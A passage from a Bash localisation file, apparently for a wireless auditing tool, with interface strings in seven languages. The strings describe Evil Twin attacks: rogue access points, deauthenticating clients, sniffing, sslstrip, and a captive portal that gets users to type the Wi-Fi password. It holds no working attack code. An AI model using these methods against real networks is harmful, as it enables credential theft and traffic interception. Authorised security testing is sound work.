	arr["SPANISH",254]="Para utilizar los ataques de Evil Twin de solo AP y con sniffing, deberás tener además de la interfaz wifi que se transformará en el AP, otra interfaz de red con acceso a internet para proporcionar este servicio a otros clientes de la red. Esta no hace falta que sea wifi, puede ser ethernet"
	arr["FRENCH",254]="Pour effectuer l'attaque Evil Twin combinant Rogue AP et capture des données vous avez besoin d'une interface réseau en plus de celle utilisée pour créer le point d'accès. Cette interface supplémentaire devra être connecté à l'internet afin d'en proportionner l'accès aux clients du réseau. L'interface peut être une interface ethernet ou wifi"
	arr["CATALAN",254]="Per utilitzar els atacs d'Evil Twin només amb AP i sniffing, hauràs de tenir a més de la interfície wifi que es transformarà en el AP, una altre interfície de xarxa amb accés a internet per proporcionar aquest servei a altres clients de la xarxa. Aquesta no cal que sigui wifi, pot ser ethernet"
	arr["PORTUGUESE",254]="Para usar ataques Evil Twin Somente AP e com sniffing, você deve ter além da interface wifi que se tornará a AP, uma outra interface de rede com acesso à internet para fornecer este serviço a outros clientes da rede. Não precisa ser wifi, pode ser ethernet"
	arr["RUSSIAN",254]="Чтобы использовать Злого Двойника точки доступа и атаку сниффинга, вы должны иметь другой интерфейс в дополнение к сетевому интерфейсу wifi. Сетевой интерфейс wifi станет точкой доступа, к которому будут подключаться жертвы. Для того, чтобы у этой точки доступа было Интернет-подключение и используется второй сетевой адаптер. Ему необязательно быть wifi, достаточно ethernet"
	arr["GREEK",254]="Για να χρησιμοποιήσετε τις επιθέσεις sniffing και Evil Twin με AP, πρέπει να έχετε άλλη μία διεπαφή παράλληλα με την διεπαφή δικτύου wifi που θα γίνει AP, η οποία θα παρέχει πρόσβαση στο διαδίκτυο στους άλλες χρήστες του δικτύου. Δεν χρειάζεται να είναι wifi, μπορεί να έιναι και ethernet"

	arr["ENGLISH",255]="without sniffing, just AP"
	arr["SPANISH",255]="sin sniffing, solo AP"
	arr["FRENCH",255]="rogue AP sans capture des données"
	arr["CATALAN",255]="sense sniffing, només AP"
	arr["PORTUGUESE",255]="Somente AP, sem sniffing"
	arr["RUSSIAN",255]="без сниффинга, просто ТД"
	arr["GREEK",255]="χωρίς sniffing, μόνο AP"

	arr["ENGLISH",256]="5.  Evil Twin attack just AP"
	arr["SPANISH",256]="5.  Ataque Evil Twin solo AP"
	arr["FRENCH",256]="5.  Attaque Evil Twin Rogue AP simple"
	arr["CATALAN",256]="5.  Atac Evil Twin només AP"
	arr["PORTUGUESE",256]="5.  Ataque Evil Twin só AP"
	arr["RUSSIAN",256]="5.  Атака Злой Двойник, только ТД"
	arr["GREEK",256]="5.  Επίθεση Evil Twin μόνο AP"

	arr["ENGLISH",257]="with sniffing"
	arr["SPANISH",257]="con sniffing"
	arr["FRENCH",257]="avec capture des données"
	arr["CATALAN",257]="amb sniffing"
	arr["PORTUGUESE",257]="com sniffing"
	arr["RUSSIAN",257]="со сниффингом"
	arr["GREEK",257]="με sniffing"

	arr["ENGLISH",258]="If you use the attack without sniffing, just AP, you'll can use any external to script sniffer software"
	arr["SPANISH",258]="Si utilizas el ataque sin sniffing, solo AP, podrás usar cualquier programa sniffer externo al script"
	arr["FRENCH",258]="Si vous lancez l'attaque sans capture des données (Rogue AP) vous pouvez utiliser un programme externe pour les capturer"
	arr["CATALAN",258]="Si utilitzes l'atac sense sniffing, només AP, podràs fer servir qualsevol programa sniffer extern a l'script"
	arr["PORTUGUESE",258]="Se você usar o ataque sem sniffing, apenas a AP, você pode usar qualquer programa sniffer externo ao script"
	arr["RUSSIAN",258]="Если вы используете атаку без сниффинга, только ТД, то вы сможете использовать любое внешнее ПО для сниффинга"
	arr["GREEK",258]="Αν χρησιμοποιήσετε την επίθεση χωρίς sniffing, μόνο AP, θα μπορείτε να χρησιμοποιήσετε οποιοδήποτε εξωτερίκό sniffer script"

	arr["ENGLISH",259]="6.  Evil Twin AP attack with sniffing"
	arr["SPANISH",259]="6.  Ataque Evil Twin AP con sniffing"
	arr["FRENCH",259]="6.  Attaque Evil Twin avec Rogue AP et capture des données"
	arr["CATALAN",259]="6.  Atac Evil Twin AP amb sniffing"
	arr["PORTUGUESE",259]="6.  Ataque Evil Twin AP com sniffing"
	arr["RUSSIAN",259]="6.  Атака Злой Двойник ТД со сниффингом"
	arr["GREEK",259]="6.  Επίθεση Evil Twin AP με sniffing"

	arr["ENGLISH",260]="9.  Return to main menu"
	arr["SPANISH",260]="9.  Volver al menú principal"
	arr["FRENCH",260]="9.  Retourner au menu principal"
	arr["CATALAN",260]="9.  Tornar al menú principal"
	arr["PORTUGUESE",260]="9.  Voltar ao menu principal"
	arr["RUSSIAN",260]="9.  Возврат в главное меню"
	arr["GREEK",260]="9.  Επιστροφή στο αρχικό μενού"

	arr["ENGLISH",261]="7.  Evil Twin AP attack with sniffing and sslstrip"
	arr["SPANISH",261]="7.  Ataque Evil Twin AP con sniffing y sslstrip"
	arr["FRENCH",261]="7.  Attaque Evil Twin avec capture des données et sslstrip"
	arr["CATALAN",261]="7.  Atac Evil Twin AP amb sniffing i sslstrip"
	arr["PORTUGUESE",261]="7.  Ataque Evil Twin AP com sniffing e sslstrip"
	arr["RUSSIAN",261]="7.  Атака Злой Двойник ТД со сниффингом и sslstrip"
	arr["GREEK",261]="7.  Επίθεση Evil Twin AP με sniffing και sslstrip"

	arr["ENGLISH",262]="without sniffing, captive portal"
	arr["SPANISH",262]="sin sniffing, portal cautivo"
	arr["FRENCH",262]="sans capture des données avec portail captif"
	arr["CATALAN",262]="sense sniffing, portal captiu"
	arr["PORTUGUESE",262]="Sem sniffing, portal cativo"
	arr["RUSSIAN",262]="без сниффинга, перехватывающий портал"
	arr["GREEK",262]="χωρίς sniffing, captive portal"

	arr["ENGLISH",263]="8.  Evil Twin AP attack with captive portal (monitor mode needed)"
	arr["SPANISH",263]="8.  Ataque Evil Twin AP con portal cautivo (modo monitor requerido)"
	arr["FRENCH",263]="8.  Attaque Evil Twin avec portail captif (mode moniteur nécessaire)"
	arr["CATALAN",263]="8.  Atac Evil Twin AP amb portal captiu (es requereix mode monitor)"
	arr["PORTUGUESE",263]="8.  Ataque Evil Twin AP com portal cativo (modo monitor obrigatório)"
	arr["RUSSIAN",263]="8.  Атака Злой Двойник ТД с перехватывающим порталом (необходим режим монитора)"
	arr["GREEK",263]="8.  Επίθεση Evil Twin AP με captive portal (χρειάζεται η κατάσταση παρακολούθησης)"

	arr["ENGLISH",264]="The captive portal attack tries to one of the network clients provide us the password for the wifi network by entering it on our portal"
	arr["SPANISH",264]="El ataque del portal cautivo intentará conseguir que uno de los clientes de la red nos proporcione la contraseña de la red wifi introduciéndola en nuestro portal"
	arr["FRENCH",264]="Le portail captif d'attaque tente d'obtenir l'un des clients du réseau nous fournir le mot de passe pour le réseau sans fil en entrant sur notre site"
	arr["CATALAN",264]="L'atac de portal captiu intenta aconseguir que un dels clients de la xarxa ens proporcioni la contrasenya de la xarxa wifi introduint-la al nostre portal"
	arr["PORTUGUESE",264]="O ataque com portal cativo tenta fazer com que um dos clientes da rede nos forneça a senha  da rede sem fio digitando-o em nosso site"
	arr["RUSSIAN",264]="Атака с перехватывающим порталом заключается в том, что мы ждём когда кто-то из пользователей введёт верный пароль от Wi-Fi на веб-странице, которую мы ему показываем"
	arr["GREEK",264]="Η επίθεση captive portal κάνει έναν από τους χρήστες του δικτύου να μας παρέχει τον κωδικό πρόσβασης του δικτύου wifi βάζοντάς τον στο portal μας"

	arr["ENGLISH",265]="Evil Twin deauth"
	arr["SPANISH",265]="Desautenticación para Evil Twin"
	arr["FRENCH",265]="Dés-authentification pour Evil Twin"
	arr["CATALAN",265]="Desautenticació per Evil Twin"
	arr["PORTUGUESE",265]="Desautenticação para Evil Twin"
	arr["RUSSIAN",265]="Деаутентификация для Злого Двойника"
	arr["GREEK",265]="Evil Twin deauth"

	arr["ENGLISH",266]="4.  Return to Evil Twin attacks menu"
	arr["SPANISH",266]="4.  Volver al menú de ataques Evil Twin"
	arr["FRENCH",266]="4.  Retour au menu d'attaques Evil Twin"
	arr["CATALAN",266]="4.  Tornar al menú d'atacs Evil Twin"
	arr["PORTUGUESE",266]="4.  Voltar ao menu de ataques Evil Twin"
	arr["RUSSIAN",266]="4.  Вернуться в меню атак Злой Двойник"
	arr["GREEK",266]="4.  Επιστροφή στο μενού επιθέσεων Evil Twin"

	arr["ENGLISH",267]="If you can't deauth clients from an AP using an attack, choose another one :)"
	arr["SPANISH",267]="Si no consigues desautenticar a los clientes de un AP con un ataque, elige otro :)"
	arr["FRENCH",267]="Si vous ne pouvez pas dé-authentifier des clients avec une attaque, choisissez-en une autre :)"
	arr["CATALAN",267]="Si no aconsegueixes desautenticar als clients d'un AP amb un atac, tria un altre :)"
	arr["PORTUGUESE",267]="Se você não conseguir desautenticar clientes de um AP usando um ataque, escolha outro :)"
	arr["RUSSIAN",267]="Если вы не можете деаутентифицировать клиентов от ТД используя эту атаку, выберите другую :)"
	arr["GREEK",267]="Αν δεν μπορείτε να κάνετε deauth τους χρήστες από ένα AP χρησιμοποιώντας μία επίθεση, διαλέξτε κάποια άλλη :)"

	arr["ENGLISH",268]="With this attack, we'll try to deauth clients from the legitimate AP. Hopefully they'll reconnect to our Evil Twin AP"
	arr["SPANISH",268]="Con este ataque, intentaremos desautenticar a los clientes del AP legítimo. Con suerte reconectarán pero a nuestro Evil Twin AP"
	arr["FRENCH",268]="Avec cette attaque nous essayons de déconnecter des clients du point d'accès légitime en espérant qu'ils se connectent au notre Evil Twin AP"
	arr["CATALAN",268]="Amb aquest atac, intentarem desautenticar als clients del AP legítim. Amb sort reconectarán però al nostre Evil Twin AP"
	arr["PORTUGUESE",268]="Com este ataque, tentamos desautenticar clientes do AP legítimo e esperemos que eles se reconectar mas o nosso AP Evil Twin"
	arr["RUSSIAN",268]="Этой атакой мы попытаемся деаутентифицировать клиентов от легитимной ТД. В надежде, что они переподключатся к нашему Злому Двойнику ТД"
	arr["GREEK",268]="Με αυτήν την επίθεση, θα προσπαθήσουμε να κάνουμε deauth τους χρήστες από το αρχικό AP. Ας ελπίσουμε ότι θα επανασυνδεθούν στο Evil Twin AP μας"

	arr["ENGLISH",269]="To perform an Evil Twin attack you'll need to be very close to the target AP or have a very powerful wifi antenna. Your signal must reach clients equally strong or more than the legitimate AP"
	arr["SPANISH",269]="Para realizar un ataque Evil Twin necesitarás estar muy cerca del AP objetivo o tener una antena wifi muy potente. Tu señal ha de llegar a los clientes igual de fuerte o más que la del AP legítimo"
	arr["FRENCH",269]="Pour mener à bien une attaque Evil Twin il vous faut être dans de bonnes conditions d'émission et de réception tantôt avec le point d'accès qu'avec le(s) client(s)"
	arr["CATALAN",269]="Per realitzar un atac Evil Twin et caldrà estar molt a prop de l'AP objectiu o tenir una antena wifi molt potent. El teu senyal ha d'arribar als clients igual de fort o més que la de l'AP legítim"
	arr["PORTUGUESE",269]="Para fazer um ataque Evil Twin você precisa estar perto do alvo ou ter uma antena wifi muito poderosa. Seu sinal deve atingir os clientes igualmente forte ou mais do que o AP legítimo"
	arr["RUSSIAN",269]="Для выполнения атаки злой двойник, вы должны быть очень близко к целевой ТД или иметь очень мощную wifi антенну.  Ваш сигнал должен достигать клиентов с такой же силой, или даже сильнее, чем легитимная ТД"
	arr["GREEK",269]="Για να πραγματοποιηθεί μία επίθεση Evil Twin θα πρέπει να είστε αρκετά κοντά στο AP-στόχο ή να έχετε μία πολύ ισχυρή κεραία. Το σήμα πρέπει να φτάνει στους χρήστες το ίδιο ή περισσότερο από το αρχικό AP"

	arr["ENGLISH",270]="Evil Twin attack just AP"
	arr["SPANISH",270]="Ataque Evil Twin solo AP"
	arr["FRENCH",270]="Attaque Evil Twin Rogue AP simple"
	arr["CATALAN",270]="Atac Evil Twin només AP"
	arr["PORTUGUESE",270]="Ataque Evil Twin só AP"
	arr["RUSSIAN",270]="Атака Злой Двойник, просто ТД"
	arr["GREEK",270]="Επίθεση Evil Twin μόνο AP"

	arr["ENGLISH",271]="Selected BSSID: ${pink_color}None${normal_color}"
	arr["SPANISH",271]="BSSID seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",271]="BSSID sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",271]="BSSID seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",271]="BSSID selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",271]="Выбранная BSSID: ${pink_color}Нет${normal_color}"
	arr["GREEK",271]="Επιλεγμένο BSSID: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",272]="Deauthentication chosen method: ${pink_color}${et_dos_attack}${normal_color}"
	arr["SPANISH",272]="Método elegido de desautenticación: ${pink_color}${et_dos_attack}${normal_color}"
	arr["FRENCH",272]="Méthode de dés-authentification: ${pink_color}${et_dos_attack}${normal_color}"
	arr["CATALAN",272]="Mètode elegit d'desautenticació: ${pink_color}${et_dos_attack}${normal_color}"
	arr["PORTUGUESE",272]="Método de desautenticação escolhido: ${pink_color}${et_dos_attack}${normal_color}"
	arr["RUSSIAN",272]="Выбор метода деаутентификации: ${pink_color}${et_dos_attack}${normal_color}"
	arr["GREEK",272]="Επιλεγμένη μέθοδος για deauthentication: ${pink_color}${et_dos_attack}${normal_color}"

	arr["ENGLISH",273]="Selected channel: ${pink_color}None${normal_color}"
	arr["SPANISH",273]="Canal seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",273]="Canal sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",273]="Canal seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",273]="Canal selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",273]="Выбранный канал: ${pink_color}Нет${normal_color}"
	arr["GREEK",273]="Επιλεγμένο κανάλι: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",274]="Selected ESSID: ${pink_color}None${normal_color}"
	arr["SPANISH",274]="ESSID seleccionado: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",274]="ESSID sélectionné: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",274]="ESSID seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",274]="ESSID selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",274]="Выбранная ESSID: ${pink_color}Нет${normal_color}"
	arr["GREEK",274]="Επιλεγμένο ESSID: ${pink_color}Κανένα${normal_color}"

	arr["ENGLISH",275]="In addition to the software requirements that already meet if you get here, you need to provide target AP data to carry out the attack"
	arr["SPANISH",275]="Además de los requisitos de software, que ya cumples si has llegado hasta aquí, es necesario proporcionar los datos del AP objetivo para llevar a cabo el ataque"
	arr["FRENCH",275]="Maintenant que les dépendances ont étés vérifiées il vous faut saisir les donnés sur le point d'accès cible"
	arr["CATALAN",275]="A més dels requisits de software, que ja compleixes si has arribat fins aquí, cal proporcionar les dades de l'AP objectiu per dur a terme l'atac"
	arr["PORTUGUESE",275]="Além dos requisitos de software, você precisa fornecer dados do AP objetivos para realizar o ataque"
	arr["RUSSIAN",275]="Если вы попали сюда, то в дополнении к требованиям к программному обеспечению, которым вы уже соответствуете, вам нужно обеспечить Интернет подключения вашей ТД для выполнения атаки"
	arr["GREEK",275]="Εκτός από τις απαιτήσεις του λογισμικού οι οποίες πληρούνται αν έχετε φτάσει έως εδώ, χρειάζεται να παρέχετε δεδομένα AP-στόχου για να πραγματοποιηθεί η επίθεση"

	arr["ENGLISH",276]="On top of this screen you can see all that is needed to perform the attack. If any of the parameters has no value, you can enter it manually, or you can go back to select a target and then return here"
	arr["SPANISH",276]="En la parte superior de esta pantalla puedes ver todo lo que hace falta para realizar el ataque. Si alguno de los parámetros no tiene valor, puedes introducirlo manualmente, o puedes retroceder para seleccionar un objetivo y regresar aquí"
	arr["FRENCH",276]="Vous pouvez voir dans la partie supérieure de l'écran tout ce qui est nécessaire à l'attaque. Si l'un des paramètres est en blanc vous pouvez l'entrer manuellement ou bien vous pouvez revenir en arrière pour sélectionner une cible et revenir ici"
	arr["CATALAN",276]="A la part superior d'aquesta pantalla pots veure tot el que cal per realitzar l'atac. Si algun dels paràmetres no té valor, pots introduir-lo manualment, o pots retrocedir per a seleccionar un objectiu i tornar aquí"
	arr["PORTUGUESE",276]="No topo da tela você pode ver tudo o que é necessário para realizar o ataque. Se qualquer um dos parâmetros não tem nenhum valor, pode introduzi-lo manualmente, ou você pode voltar para selecionar um alvo e voltar aqui"
	arr["RUSSIAN",276]="Наверху экрана вы можете увидеть всё, что вам нужно для выполнения этой атаки. Если какие-либо из этих параметров не имеют значения, вы можете ввести их вручную или вы можете вернуться назад для выбора цели, а затем вернуться сюда"
	arr["GREEK",276]="Πάνω από αυτή την οθόνη μπορείτε να δείτε ό,τι χρειάζεται για να εκτελεστεί η επίθεση. Αν κάποια παραμέτρος δεν έχει τιμή, μπορείτε να την εισάγετε χειροκίνητα, ή μπορείτε να πάτε πίσω για να επιλέξετε εαν στόχο και μετά να επιστρέψετε εδώ"

	arr["ENGLISH",277]="Do you want to continue? ${normal_color}[y/n]"
	arr["SPANISH",277]="¿Deseas continuar? ${normal_color}[y/n]"
	arr["FRENCH",277]="Voulez-vous continuer? ${normal_color}[y/n]"
	arr["CATALAN",277]="¿Vols continuar? ${normal_color}[y/n]"
	arr["PORTUGUESE",277]="Você deseja continuar? ${normal_color}[y/n]"
	arr["RUSSIAN",277]="Вы хотите продолжить? ${normal_color}[y/n]"
	arr["GREEK",277]="Θέλετε να συνεχίσετε; ${normal_color}[y/n]"

	arr["ENGLISH",278]="Deauthentication chosen method: ${pink_color}None${normal_color}"
	arr["SPANISH",278]="Método elegido de desautenticación: ${pink_color}Ninguno${normal_color}"
	arr["FRENCH",278]="Méthode de dés-authentification: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",278]="Mètode elegit d'desautenticació: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",278]="Método de desautenticação escolhido: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",278]="Выбор метода деаутентификации: ${pink_color}Нет${normal_color}"
	arr["GREEK",278]="Επιλεγμένη μέθοδος deauthentication: ${pink_color}Καμία${normal_color}"

	arr["ENGLISH",279]="Select another interface with internet access :"
	arr["SPANISH",279]="Selecciona otra interfaz que tenga acceso a internet :"
	arr["FRENCH",279]="Choisissez une autre interface qui ait accès à internet :"
	arr["CATALAN",279]="Selecciona una altra interfície que tingui accés a internet :"
	arr["PORTUGUESE",279]="Selecione outra interface que tem acesso à internet :"
	arr["RUSSIAN",279]="Выбор другого интерфейса с Интернет доступом :"
	arr["GREEK",279]="Επιλέξτε άλλη διεπαφή με προσβαση στο διαδίκτυο :"

	arr["ENGLISH",280]="On this screen, it's supposed an additional interface to provide internet access is chosen, but you don't have anyone at this moment"
	arr["SPANISH",280]="En esta pantalla, se supone que deberías elegir otro interfaz adicional para proporcionar acceso a internet, pero no dispones de ninguno en este momento"
	arr["FRENCH",280]="Sur cet écran vous êtes censé choisir une interface supplémentaire connectée à internet mais vous n'en avez pas en ce moment"
	arr["CATALAN",280]="En aquesta pantalla, se suposa que hauries de triar un altre interfície addicional per a proporcionar accés a internet, però no disposes de cap en aquest moment"
	arr["PORTUGUESE",280]="Nesta tela, você deveria escolher uma interface adicional para fornecer acesso à internet, mas você não tem nenhuma neste momento"
	arr["RUSSIAN",280]="На этом экране предполагается, что выбран дополнительный интерфейс для предоставления Интернет доступа, но у вас его на текущий момент нет"
	arr["GREEK",280]="Σε αυτή την οθόνη, υποτίθεται πως επιλέγεται μία επιπρόσθετη διεπαφή που παρέχει πρόσβαση στο διαδίκτυο, αλλά δεν έχετε κανέναν αυτή τη στιγμή"

	arr["ENGLISH",281]="The interface ${interface} you have already selected is not a wifi card. This attack needs a wifi card selected"
	arr["SPANISH",281]="El interfaz ${interface} que tienes seleccionado no es una tarjeta wifi. Este ataque necesita que la interfaz seleccionada sea wifi"
	arr["FRENCH",281]="L'interface ${interface} que vous avez sélectionnée n'est pas une carte wifi. Cette attaque exige que l'interface sélectionnée soit une carte wifi"
	arr["CATALAN",281]="La interfície ${interface} que tens seleccionada no és una targeta wifi. Aquest atac necessita que la interfície seleccionada sigui wifi"
	arr["PORTUGUESE",281]="$ A interface ${interface} que você selecionou não é wifi. Este ataque requer uma interface wifi selecionada"
	arr["RUSSIAN",281]="Интерфейс ${interface}, который вы выбрали не является wifi картой. Эта атака требует выбрать wifi карту"
	arr["GREEK",281]="Η διεπαφή ${interface} που έχετε ήδη επιλέξει δεν έιναι κάρτα wifi. Αυτή η επίθεση χρειάζεται μία κάρτα wifi επιλεγμένη"

	arr["ENGLISH",282]="Selected internet interface: ${pink_color}${internet_interface}${normal_color}"
	arr["SPANISH",282]="Interfaz con internet seleccionada: ${pink_color}${internet_interface}${normal_color}"
	arr["FRENCH",282]="Interface internet sélectionnée: ${pink_color}${internet_interface}${normal_color}"
	arr["CATALAN",282]="Interfície amb internet seleccionada: ${pink_color}${internet_interface}${normal_color}"
	arr["PORTUGUESE",282]="Interface da internet selecionado: ${pink_color}${internet_interface}${normal_color}"
	arr["RUSSIAN",282]="Выбранный Интернет интерфейс: ${pink_color}${internet_interface}${normal_color}"
	arr["GREEK",282]="Επιλεγμένη διεπαφή με πρόσβαση στο διαδίκτυο: ${pink_color}${internet_interface}${normal_color}"

	arr["ENGLISH",283]="Selected internet interface: ${pink_color}None${normal_color}"
	arr["SPANISH",283]="Interfaz con internet seleccionada: ${pink_color}Ninguna${normal_color}"
	arr["FRENCH",283]="Interface internet sélectionnée: ${pink_color}Aucun${normal_color}"
	arr["CATALAN",283]="Interfície amb internet seleccionat: ${pink_color}Ningú${normal_color}"
	arr["PORTUGUESE",283]="Interface da internet selecionado: ${pink_color}Nenhum${normal_color}"
	arr["RUSSIAN",283]="Выбранный Интернет интерфейс: ${pink_color}Нет${normal_color}"
	arr["GREEK",283]="Επιλεγμένη διεπαφή με πρόσβαση στο διαδίκτυο: ${pink_color}Καμία${normal_color}"

	arr["ENGLISH",284]="Do you want to use this selected interface? ${normal_color}[y/n]"
	arr["SPANISH",284]="¿Quieres utilizar esta interfaz ya seleccionada? ${normal_color}[y/n]"
	arr["FRENCH",284]="Souhaitez-vous utiliser l'interface déjà sélectionnée? ${normal_color}[y/n]"
	arr["CATALAN",284]="¿Vols fer servir aquesta interfície ja seleccionada? ${normal_color}[y/n]"
	arr["PORTUGUESE",284]="Você quer usar essa interface selecionada? ${normal_color}[y/n]"
	arr["RUSSIAN",284]="Вы хотите использовать этот выбранный интерфейс? ${normal_color}[y/n]"
	arr["GREEK",284]="Θέλετε να χρησιμοποιήσετε αυτή την επιλεγμένη διεπαφή; ${normal_color}[y/n]"

	arr["ENGLISH",285]="Selected interface with internet access detected during this session [${normal_color}${internet_interface}${blue_color}]"
	arr["SPANISH",285]="Se ha detectado que ya tiene un interfaz con acceso a internet seleccionada en esta sesión [${normal_color}${internet_interface}${blue_color}]"
	arr["FRENCH",285]="Une interface avec accès à internet a déjà été sélectionné pour cette session [${normal_color}${internet_interface}${blue_color}]"
	arr["CATALAN",285]="S'ha detectat que ja té una interfície amb accés a internet seleccionada en aquesta sessió [${normal_color}${internet_interface}${blue_color}]"
	arr["PORTUGUESE",285]="Verificou-se que há uma interface com acesso à internet seleccionado nesta sessão [${normal_color}${internet_interface}${blue_color}]"
	arr["RUSSIAN",285]="Во время этой сессии обнаружен выбранный интерфейс с Интернет подключением [${normal_color}${internet_interface}${blue_color}]"
	arr["GREEK",285]="Η επιλεγμένη διεπαφή με πρόσβαση στο διαδίκτυο εντοπίστηκε κατά τη διάρκεια της συνεδρίας [${normal_color}${internet_interface}${blue_color}]"

	arr["ENGLISH",286]="If you don't have a captured Handshake file from the target network you can get it now"
	arr["SPANISH",286]="Si no tienes un fichero de Handshake capturado de la red objetivo puedes obtenerlo ahora"
	arr["FRENCH",286]="Si vous n'avez pas un fichier de capture contenant un Handshake du réseau cible vous pouvez l'obtenir maintenant"
	arr["CATALAN",286]="Si no tens un fitxer de Handshake capturat de la xarxa objectiu pots obtenir-ho ara"
	arr["PORTUGUESE",286]="Se você não tem um arquivo Handshake capturado da rede alvo você pode obtê-lo agora"
	arr["RUSSIAN",286]="Если у вас отсутствует файл с рукопожатием целевой сети, вы можете сейчас захватить его"
	arr["GREEK",286]="Εάν δεν έχετε κάποιο αρχείο Χειραψίας από το δίκτυο-στόχος μπορείτε να το πάρετε τώρα"

	arr["ENGLISH",287]="The script will check for internet access. Please be patient..."
	arr["SPANISH",287]="El script va a comprobar si tienes acceso a internet. Por favor ten paciencia..."
	arr["FRENCH",287]="Le script va vérifier que vous aillez accès à internet. Soyez patients s'il vous plaît..."
	arr["CATALAN",287]="El script comprovarà si tens accés a internet. Si us plau sigues pacient..."
	arr["PORTUGUESE",287]="O script irá verificar se você tem acesso à internet. Por favor,aguarde..."
	arr["RUSSIAN",287]="Этот скрипт проверит Интернет доступ. Подождите немного..."
	arr["GREEK",287]="Το script θα ελέγξει αν έχετε πρόσβαση στο διαδίκτυο. Παρακαλώ έχετε λίγη υπομονή..."

	arr["ENGLISH",288]="It seems you have no internet access. This attack needs an interface with internet access"
	arr["SPANISH",288]="Parece que no tienes conexión a internet. Este ataque necesita una interfaz con acceso a internet"
	arr["FRENCH",288]="Il semble que vous ne pouvez pas vous connecter à internet. Cette attaque a besoin d'une interface avec u accès internet"
	arr["CATALAN",288]="Sembla que no tens connexió a internet. Aquest atac necessita una interfície amb accés a internet"
	arr["PORTUGUESE",288]="Parece que você não tem acesso à internet. Este ataque precisa de uma interface com acesso à internet"
	arr["RUSSIAN",288]="Судя по всему, у вас нет Интернет доступа. Эта атака требует интерфейс с Интернет доступом"
	arr["GREEK",288]="Φαίνεται πως δεν έχετε πρόσβαση στο διαδίκτυο. Αυτή η επίθεση χρειάζεται μία διεπαφή με πρόσβαση στο διαδίκτυο"

	arr["ENGLISH",289]="It has been verified successfully you have internet access on selected interface. Script can continue..."
	arr["SPANISH",289]="Se ha verificado correctamente que tienes acceso a internet en la interfaz seleccionada. El script puede continuar..."
	arr["FRENCH",289]="Confirmation de l'accès internet pour l'interface réseaux choisie. Le script peut continuer..."
	arr["CATALAN",289]="S'ha verificat correctament que tens accés a internet a la interfície seleccionada. El script pot continuar..."
	arr["PORTUGUESE",289]="Verificou-se com sucesso que você tem acesso à internet na interface selecionada. O script pode continuar..."
	arr["RUSSIAN",289]="Проверка Интернет доступа прошла успешно на выбранном интерфейс. Скрипт может продолжать..."
	arr["GREEK",289]="Επαληθεύτηκε επιτυχώς πως έχετε πρόσβαση στο διαδίκτυο με την επιλεγμένη διεπαφή. Το script μπορεί να συνεχίσει..."

	arr["ENGLISH",290]="It seems you have internet access but not in the selected interface acting as interface with internet access"
	arr["SPANISH",290]="Parece que tienes conexión a internet pero no en la interfaz seleccionada como interfaz con acceso a internet"
	arr["FRENCH",290]="Il semble bien que vous avez accès à internet mais pas avec l'interface sélectionnée à cet effet"
	arr["CATALAN",290]="Sembla que tens connexió a internet però no en la interfície seleccionada com a interfície amb accés a internet"
	arr["PORTUGUESE",290]="Parece que você tem internet, mas não na interface selecionada"
	arr["RUSSIAN",290]="Судя по всему у вас есть Интернет доступ, но не на выбранном для Интернет доступа интерфейсе"
	arr["GREEK",290]="Φαίνεται πως έχετε πρόσβαση στο διαδίκτυο αλλά όχι στην επιλεγμένη διεπαφή που ενεργεί ως διεπαφή με πρόσβαση στο διαδίκτυο"

	arr["ENGLISH",291]="Evil Twin AP attack with sniffing"
	arr["SPANISH",291]="Ataque Evil Twin AP con sniffing"
	arr["FRENCH",291]="Attaque Evil Twin avec capture de données"
	arr["CATALAN",291]="Atac Evil Twin AP amb sniffing"
	arr["PORTUGUESE",291]="Ataque Evil Twin AP com sniffing"
	arr["RUSSIAN",291]="Атака Злой Двойник ТД со сниффингом"
	arr["GREEK",291]="Επίθεση Evil Twin AP με sniffing"

	arr["ENGLISH",292]="Evil Twin AP attack with sniffing and sslstrip"
	arr["SPANISH",292]="Ataque Evil Twin AP con sniffing y sslstrip"
	arr["FRENCH",292]="Attaque Evil Twin avec capture de données et sslstrip"
	arr["CATALAN",292]="Atac Evil Twin AP amb sniffing i sslstrip"
	arr["PORTUGUESE",292]="Ataque Evil Twin AP com sniffing e sslstrip"
	arr["RUSSIAN",292]="Атака Злой Двойник ТД со сниффингом и sslstrip"
	arr["GREEK",292]="Επίθεση Evil Twin AP με sniffing και sslstrip"

	arr["ENGLISH",293]="Evil Twin AP attack with captive portal"
	arr["SPANISH",293]="Ataque Evil Twin AP con portal cautivo"
	arr["FRENCH",293]="Attaque Evil Twin avec portail captif"
	arr["CATALAN",293]="Atac Evil Twin AP amb portal captiu"
	arr["PORTUGUESE",293]="Ataque Evil Twin AP com portal cativo"
	arr["RUSSIAN",293]="Атака Злой Двойник ТД с перехватывающим порталом"
	arr["GREEK",293]="Επίθεση Evil Twin AP με captive portal"

	arr["ENGLISH",294]="Detecting resolution... Detected! : ${normal_color}${resolution}"
	arr["SPANISH",294]="Detectando resolución... Detectada! : ${normal_color}${resolution}"
	arr["FRENCH",294]="Détection de la résolution... Détectée! : ${normal_color}${resolution}"
	arr["CATALAN",294]="Detectant resolució... Detectada! : ${normal_color}${resolution}"
	arr["PORTUGUESE",294]="Detectando resolução... Detectada! : ${normal_color}${resolution}"
	arr["RUSSIAN",294]="Определение разрешения... Определено! : ${normal_color}${resolution}"
	arr["GREEK",294]="Εντοπίζεται η ανάλυση... Εντοπίστηκε! : ${normal_color}${resolution}"

	arr["ENGLISH",295]="Detecting resolution... Can't be detected!, using standard : ${normal_color}${resolution}"
	arr["SPANISH",295]="Detectando resolución... No se ha podido detectar!, usando estándar : ${normal_color}${resolution}"
